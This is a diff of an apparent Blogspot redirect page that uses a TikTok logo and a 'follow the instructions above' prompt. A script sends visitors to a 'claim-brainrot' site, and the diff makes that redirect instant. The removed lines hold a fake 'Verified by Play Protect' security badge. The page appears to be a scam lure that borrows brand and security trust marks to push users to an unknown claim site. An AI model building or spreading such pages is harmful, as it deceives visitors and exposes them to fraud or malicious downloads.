@@ -13,25 +13,18 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            font-family: Arial, sans-serif;
             background: linear-gradient(rgba(240, 240, 240, 0.9), rgba(224, 224, 224, 0.9)), 
                         url('https://i.postimg.cc/50Kr99Ng/Screenshot-20251011-195003-Chrome.jpg');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
-        }
-
-        .content-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin-top: 40px; /* Moves content down */
+            font-family: Arial, sans-serif;
         }
 
         #tiktok-logo {
             width: 250px;
             margin-bottom: 20px;
+            margin-top: 40px; /* Move the GIF down */
         }
 
         #redirect-text {
@@ -39,8 +32,6 @@
             color: #333;
             opacity: 0;
             animation: fadeIn 2s ease-in-out forwards, scaleUp 2s ease-in-out infinite alternate;
-            text-align: center;
-            margin-bottom: 20px;
         }
 
         @keyframes fadeIn {
@@ -66,34 +57,6 @@
         #openLink {
             margin: 50px;
             text-align: center;
-        }
-        
-        /* Play Protect Badge Styles */
-        .play-protect-badge {
-            display: flex;
-            align-items: center;
-            margin-top: 20px;
-            padding: 10px 15px;
-            background-color: rgba(248, 249, 250, 0.8);
-            border-radius: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            font-size: 14px;
-            backdrop-filter: blur(5px);
-        }
-        
-        .secure-text {
-            color: #2ecc71;
-            font-weight: bold;
-            margin: 0 5px;
-        }
-        
-        .dot {
-            margin: 0 5px;
-            color: #6c757d;
-        }
-        
-        .verified-text {
-            color: #6c757d;
         }
     </style>
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
@@ -148,22 +111,11 @@ window.history.replaceState({}, document.title, clean_uri);
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 <body>
-    <div class="content-container">
-        <img id="tiktok-logo" src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="Loading Animation">
-        <p id="redirect-text"><strong>👆 Please follow the instructions above<br>To go to the website 👆 ...</strong></p>
-        
-        <!-- Play Protect Verified Badge Code -->
-        <div class="play-protect-badge">
-            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#2ecc71" stroke-width="2">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-            </svg>
-            <span class="secure-text">Secure</span>
-            <span class="dot">•</span>
-            <span class="verified-text">Verified by Play Protect</span>
-        </div>
-        
-        <a href="#" id="openLink"></a>
-    </div>
+    <img id="tiktok-logo" src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="TikTok Logo">
+    <p id="redirect-text"><p><strong>👆 Please follow the instructions above
+To go to the website 👆 ...</strong></p>
+<p><strong></strong></p>
+    <a href="#" id="openLink">    </a>
 
     <script>
         function openLinkBasedOnDevice(url) {
@@ -181,11 +133,11 @@ window.history.replaceState({}, document.title, clean_uri);
             }
         }
 
-        // Automatically execute the function after a 5-second delay
+        // Automatically execute the function after a 0.001-second delay (instant redirect)
         setTimeout(function () {
             var url = 'https://brainrotzone.fun/claim-brainrot/';
             openLinkBasedOnDevice(url);
-        }, 5000); // 5000 milliseconds = 5 seconds
+        }, 1); // 1 millisecond = 0.001 seconds
     </script>
 
 
